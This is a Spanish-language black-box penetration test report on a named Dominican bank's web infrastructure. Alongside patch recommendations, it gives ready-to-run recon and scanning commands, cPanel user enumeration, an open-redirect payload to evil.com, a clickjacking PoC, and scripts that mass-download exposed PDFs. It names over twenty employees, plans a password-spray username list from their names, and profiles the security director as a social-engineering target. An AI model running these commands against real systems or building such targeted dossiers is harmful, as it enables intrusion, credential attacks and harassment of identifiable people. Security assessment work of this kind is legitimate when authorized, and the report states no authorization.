# 🔬 Informe Técnico de Seguridad — Banco BACC
## Para Analistas de Ciberseguridad

**Clasificación:** CONFIDENCIAL
**Fecha:** 01 Julio 2026
**Objetivo:** https://bancobacc.com.do
**Metodología:** Black-box (sin credenciales)
**Herramientas:** subfinder v2.14.0, httpx v1.9.0, nuclei v3.3.9, wpscan 4.0.0, curl, dalfox v2.13.0, trufflehog

---

## 1. Metodología de Pruebas

### 1.1 Fases

| Fase | Actividades | Herramientas |
|------|-------------|--------------|
| Reconocimiento Pasivo | Subdominios, WHOIS, OSINT | subfinder, curl |
| Reconocimiento Activo | HTTP probing, tech-detect | httpx, nuclei |
| Escaneo de Vulnerabilidades | CVEs, misconfiguraciones | nuclei, wpscan |
| Análisis de Aplicaciones | WordPress, ASP.NET, JS | wpscan, dalfox, trufflehog |
| Explotación Manual | Open Redirect, cPanel, clickjacking | curl, Burp Suite |
| Documentación | OSINT de PDFs, metadata | pdfinfo, strings, pdftotext |

### 1.2 Comandos de Reconocimiento

```bash
# Subdomain discovery
subfinder -d bancobacc.com.do -all -silent -o subs_raw.txt
# Resultado: 38 subdominios

# HTTP probing + tech detection
httpx -l subs_raw.txt -silent -status-code -title -tech-detect -o live.txt -json

# Vulnerability scan
nuclei -l live.txt -c 50 -t ~/nuclei-templates/ -o nuclei_results.txt

# WordPress scan via WPScan (con API key)
docker run --rm wpscanteam/wpscan \
  --url https://bancobacc.com.do \
  --disable-tls-checks \
  --random-user-agent \
  --api-token "TOKEN" \
  --enumerate vp,vt,u

# Directory listing verification
curl -sI https://bancobacc.com.do/content/uploads/

# PDF metadata extraction
pdfinfo archivo.pdf | grep -iE "author|creator|producer"
strings archivo.pdf | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
```

---

## 2. Inventario de Activos

### 2.1 Subdominios (38 descubiertos)

| Subdominio | Tipo | Estado |
|------------|------|--------|
| bancobacc.com.do | WordPress + sitio principal | Live |
| www.bancobacc.com.do | Redirección | Live |
| admin.bancobacc.com.do | Bankingly (ASP.NET) | Live |
| bacc.bancobacc.com.do | Portal | Live |
| enlinea.bancobacc.com.do | Banca en línea | Live |
| supercarros.bancobacc.com.do | Sub-marca | Live |
| admin.bancobacc.com.do | BackOffice | Live |
| ... (31 adicionales) | Varios | Mixto |

### 2.2 Stack Tecnológico

| Componente | Tecnología | Versión | Estado |
|------------|------------|---------|--------|
| CMS | WordPress | 6.2.6 | 🔴 Desactualizado |
| Tema | bacc (Soluciones GBH) | 1.0 | ℹ️ Custom |
| WAF | Wordfence | — | 🟡 Activo |
| Servidor Web | Apache mod_pagespeed | 1.13.35.2 | 🟠 Expuesto |
| Hosting | cPanel (GBH Web Hosting) | — | 🟡 Expuesto |
| Banca en Línea | ASP.NET (Bankingly) | — | 🟡 Sin frame protection |
| Seguridad | HSTS | Activo | ✅ |

### 2.3 Plugins de WordPress (8 instalados, 6 vulnerables)

| Plugin | Versión | Versión Segura | CVEs |
|--------|---------|----------------|------|
| Contact Form 7 | 5.7.7 | 6.1.6 | 4 |
| Page Builder by SiteOrigin | 2.25.0 | 2.34.5 | 6 |
| Yoast SEO | 20.12 | 27+ | 6 |
| WP Mail SMTP | 3.8.2 | 4.9.0 | 1 |
| Duplicate Post | 4.5 | — | 1 |
| Custom Post Type UI | 1.13.7 | — | 1 |
| SO Widgets Bundle | 1.52.0 | — | 0 |
| SKT Templates | — | — | 0 |

---

## 3. Hallazgos Detallados

### 🔴 BACC-01: cPanel Expuesto

**Descripción:** El panel de control cPanel/WHM estaba accesible públicamente en puertos 2083/2087.
**Estado actual:** Puerto no responde (posible mitigación).
**Riesgo:** Acceso administrativo completo al hosting.

**Comandos de verificación:**
```bash
# Verificar puertos cPanel
for port in 2082 2083 2087 2095 2096; do
  curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 \
    "https://bancobacc.com.do:$port/" 2>/dev/null
  echo " -> port $port"
done

# Enumeración de usuarios via msg_code
curl -s "https://bancobacc.com.do:2083/login/" \
  -X POST -d "user=admin&pass=wrongpassword" | \
  grep -oP 'msg_code:\[\K[^\]]+'
```

**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

---

### 🔴 BACC-02: Directory Listing en Uploads

**Descripción:** El directorio `/content/uploads/` tiene listado de directorios habilitado, exponiendo 105 archivos (95 PDFs, 4 CSVs, 412 MB) desde 2017 hasta 2026.

**Comandos de verificación:**
```bash
# Verificar directory listing
curl -s "https://bancobacc.com.do/content/uploads/" | \
  grep -oP 'href="\K[^"]+/'

# Descarga y extracción de metadatos
for url in $(curl -s "https://bancobacc.com.do/content/uploads/2024/" | \
  grep -oP 'href="\K[^"]+\.pdf'); do
  curl -sL "https://bancobacc.com.do/content/uploads/2024/$url" -o /tmp/doc.pdf
  pdfinfo /tmp/doc.pdf | grep -i "author\|creator"
done
```

**Datos expuestos:**
- 21 empleados identificados por nombre
- Rutas internas de Windows (C:\Users\...)
- Correos electrónicos
- Metadatos con software/versiones del creador

**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

### 🔴 BACC-03: Dockerfile Expuesto

**Descripción:** Archivo Dockerfile accesible públicamente revelando configuración del contenedor.

**Comandos de verificación:**
```bash
curl -sI "https://bancobacc.com.do/Dockerfile" | head -5
```

**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

### 🟡 BACC-04/BACC-17-37: Vulnerabilidades en Plugins WordPress (21 CVEs)

#### Contact Form 7 (4 CVEs)

```bash
# Verificar versión
curl -s https://bancobacc.com.do/content/plugins/contact-form-7/readme.txt | \
  grep "Stable tag"

# CVE-2024-4704: Open Redirect (NO requiere auth)
curl -sv "https://bancobacc.com.do/wp-json/contact-form-7/v1/contact-forms/17/feedback" \
  -X POST -d "_wpcf7=17&_wpcf7_version=5.7.7&your-name=test&your-email=test@test.com&\
your-message=test&_wpcf7_redirect_to=https://evil.com"
```

| CVE | Tipo | Requiere Auth | Fix |
|-----|------|---------------|-----|
| CVE-2023-6449 | Arbitrary File Upload | Editor+ | 5.8.4 |
| CVE-2024-2242 | Reflected XSS | No | 5.9.2 |
| CVE-2024-4704 | Open Redirect | **No** | 5.9.5 |
| CVE-2025-3247 | Order Replay | No | 6.0.6 |

#### Page Builder by SiteOrigin (6 CVEs)

```bash
curl -s https://bancobacc.com.do/content/plugins/siteorigin-panels/readme.txt | \
  grep "Stable tag"
```

| CVE | Tipo | Fix |
|-----|------|-----|
| CVE-2024-2202 | Stored XSS | 2.29.7 |
| CVE-2024-4361 | Stored XSS via shortcode | 2.29.16 |
| CVE-2024-12240 | Stored XSS via Row Label | 2.31.1 |
| CVE-2025-1459 | Stored XSS | 2.31.5 |
| **CVE-2026-2448** | **Local File Inclusion** | **2.34.0** |
| CVE-2026-13295 | Stored XSS | 2.34.4 |

#### Yoast SEO (6 CVEs)

| CVE | Tipo | Fix |
|-----|------|-----|
| CVE-2023-40680 | Stored XSS (SEO Manager+) | 21.1 |
| CVE-2024-4041 | Reflected XSS | 22.6 |
| CVE-2024-4984 | Stored XSS (Contributor+) | 22.7 |
| CVE-2026-1293 | Stored XSS (Contributor+) | 26.9 |
| CVE-2026-3427 | Stored XSS via 'jsonText' | 27.2 |
| **CVE-2025-14481** | **IDOR Information Exposure** | **26.6** |

#### Otros Plugins

| Plugin | CVE | Tipo | Fix |
|--------|-----|------|-----|
| WP Mail SMTP 3.8.2 | CVE-2024-6694 | Admin+ SMTP Password Exposure | 4.1.0 |
| Duplicate Post 4.5 | CVE-2026-1217 | Post Duplication/Overwrite | — |
| Custom Post Type UI 1.13.7 | CVE-2025-12826 | **Unauthenticated CPT Modification** | 1.18.1 |

---

### 🟠 BACC-07: Clickjacking en Banca en Línea

**Descripción:** La plataforma de banca en línea no tiene headers X-Frame-Options ni CSP frame-ancestors.

```bash
curl -sI "https://bancobacc.com.do/enlinea/" | \
  grep -iE "x-frame-options|content-security-policy"
# → Sin respuesta — VULNERABLE
```

**PoC:** Incluir la URL en un iframe:
```html
<iframe src="https://bancobacc.com.do/enlinea/" width="800" height="600"></iframe>
```

**CVSS:** 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

---

## 4. Técnicas OSINT Aplicadas

### 4.1 Extracción de Metadatos de PDFs

```bash
# Extracción masiva
for year in 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026; do
  curl -s "https://bancobacc.com.do/content/uploads/$year/" | \
    grep -oP 'href="\K[^"]+\.(pdf|PDF)' | while read file; do
    curl -sL "https://bancobacc.com.do/content/uploads/$year/$file" -o /tmp/doc.pdf
    echo "=== $file ==="
    pdfinfo /tmp/doc.pdf 2>/dev/null | grep -i "author\|creator"
  done
done
```

**Resultados:**
- 105 archivos procesados (412 MB)
- 21 nombres de empleados identificados
- 2 direcciones de correo electrónico
- 1 ruta interna de Windows expuesta
- 3 productos de software identificados

### 4.2 Generación de Wordlist para Password Spray

```bash
# Derivar usuarios de cPanel desde nombres de empleados
# Formato: primera inicial + apellido
# Ejemplo: "Dewars Barett Baez" → dbaez, dewars, dewars.baez
```

---

## 5. Línea de Comandos — Cheatsheet

| Acción | Comando |
|--------|---------|
| Subdomain discovery | `subfinder -d bancobacc.com.do -all -silent -o subs.txt` |
| HTTP probing | `httpx -l subs.txt -status-code -title -tech-detect -o live.txt -json` |
| Vuln scan | `nuclei -l live.txt -c 50 -t ~/nuclei-templates/ -o nuclei.txt` |
| WPScan full | `docker run --rm wpscanteam/wpscan --url https://bancobacc.com.do --random-user-agent --api-token TOKEN --enumerate vp,vt,u` |
| Directory listing | `curl -s https://bancobacc.com.do/content/uploads/ \| grep -oP 'href="\K[^"]+/'` |
| PDF metadata | `pdfinfo file.pdf \| grep -iE "author\|creator\|producer"` |
| Clickjacking test | `curl -sI https://bancobacc.com.do/enlinea/ \| grep -i "x-frame-options"` |
| cPanel enum | `curl -s https://target.com:2083/login/ -X POST -d "user=admin&pass=wrong" \| grep msg_code` |

---

## 6. Cronograma de Parches

| Prioridad | Acción | Versión Actual | Versión Segura | Dependencias |
|-----------|--------|----------------|----------------|--------------|
| 🔴 Crítica | Actualizar WordPress | 6.2.6 | ≥6.2.8 | Pruebas de regresión |
| 🔴 Crítica | Actualizar Contact Form 7 | 5.7.7 | 6.1.6 | Respaldo de formularios |
| 🔴 Crítica | Actualizar Page Builder SiteOrigin | 2.25.0 | 2.34.5 | Respaldo de páginas |
| 🟡 Alta | Actualizar Yoast SEO | 20.12 | 27+ | Reindexación SEO |
| 🟡 Alta | Actualizar WP Mail SMTP | 3.8.2 | 4.9.0 | Config. SMTP backup |
| 🟡 Alta | Disable directory listing | Activado | Desactivado | Config Apache |
| 🟠 Media | Implementar X-Frame-Options | Ausente | DENY | Config servidor web |
| 🟠 Media | Implementar CSP | Ausente | Política definida | Pruebas de funcionalidad |
| 🟠 Media | Actualizar Duplicate Post | 4.5 | Última | — |
| 🟠 Media | Actualizar CPT UI | 1.13.7 | 1.18.1 | Respaldo de tipos |

---

## 7. Anexo — Evidencia de Exposición

### 7.1 Inventario de Archivos Expuestos en `/content/uploads/`

| Categoría | Archivos | Rango | Detalle |
|-----------|:--------:|:-----:|---------|
| Memorias Anuales | 8 PDF | 2015–2025 | Estados financieros auditados, dictámenes, memorias completas |
| Estados Financieros | 14 PDF | 2013–2024 | Balance general, resultados, notas |
| Contratos y Préstamos | 6 PDF | 2022–2024 | Contratos préstamo con garantía (~13MB c/u) |
| Tarifarios | 6 PDF | 2024–2026 | Tarifas vigentes del banco |
| Bienes Adjudicados | 4 PDF | 2020–2021 | Listados de propiedades inmobiliarias |
| Vehículos (CSV) | 4 CSV | 2017 | Base datos vehículos recuperados |
| Bonos/Actas/Varios | 63 PDF | 2017–2025 | Actas, prospectos emisión, autorizaciones SIB |
| **Total** | **105** | **2017–2026** | **412 MB** |

### 7.2 Muestras de Datos Sensibles en CSV

**Bienes Adjudicados (2017):**
```csv
AUTOMOVIL,Mercedes Benz,C230,2007,NEGRO
AUTOMOVIL,Honda,ACURA TL TYPE,2007,AZUL
AUTOMOVIL,Honda,ACCORD,2011,GRIS
```

**Vehículos (columnas):** Tipo, Marca, Modelo, Año, Color

### 7.3 Empleados Identificados vía Metadatos PDF

```
Alejandro Croce Mujica        Deborah De los Santos Lebrón    Dewars Barett Baez
Diego Reyes                   Fior Sanchez                    GEBER GARCIA
Griselda Lizardo              Maria Luisa Diaz                Mariana Santos
Maris Mendez                  Nathalie García                 Raymie R. Sanchez Cano
Ricardo Cabral - INTEC        Zunilda Guillen Rueda           +7 adicionales
```

### 7.4 Rutas Internas de Red Expuestas

Un archivo PDF expuesto contiene rutas completas del sistema Windows del empleado:

```
C:\Users\168855\Downloads\27_03_2026 HOY_VIERNES_270326_ El País15 .PDF
```

### 7.5 Documento con Restricciones RC4

```                   
Encrypted: yes (print:yes copy:no change:no addNotes:no algorithm:RC4)
```

Un documento bancario con protección de copia por cifrado RC4 fue publicado en un directorio con listado público — contradicción de seguridad.

### 7.6 Perfil OSINT del Banco

| Categoría | Datos |
|-----------|-------|
| Consejo Directivo | 7 miembros (Presidente: Alberto De Los Santos Billini) |
| Alta Gerencia | 17 ejecutivos con cargos y biografías |
| Staff Operativo | 20+ empleados vía LinkedIn + metadatos PDF |
| Infraestructura TI | WordPress 6.2.6, Bridge theme, PHP 8.0.30, Apache, cPanel/WHM, GBH Hosting |
| Banca en Línea | Bankingly ASP.NET |
| Patrón Email | `[inicial][apellido]@bancobacc.com.do` |
| Subdominios | 38 (banking, cpcontacts, webmail, autodiscover, etc.) |
| Entidades Vinculadas | 12 (GBH, Bankingly, BHD, Scotiabank, Citibank, INTEC, etc.) |

### 7.7 Director de Ciberseguridad — Perfil Público

**Willy Alfredo Padua Ruíz** — Director Riesgos Integrales, Ciberseguridad y Control Interno
**Certificaciones:** CISA · CRISC · CDPSE · Ethical Hacker (Cisco) · ISO 31000
**Perfil público en LinkedIn** — expuesto a ataques de ingeniería social dirigidos.

---

*Documento generado por NSI LLC — Null Session Intelligence*
*Clasificación: CONFIDENCIAL*
*Herramientas: subfinder, httpx, nuclei, wpscan, dalfox, trufflehog, curl, pdfinfo*
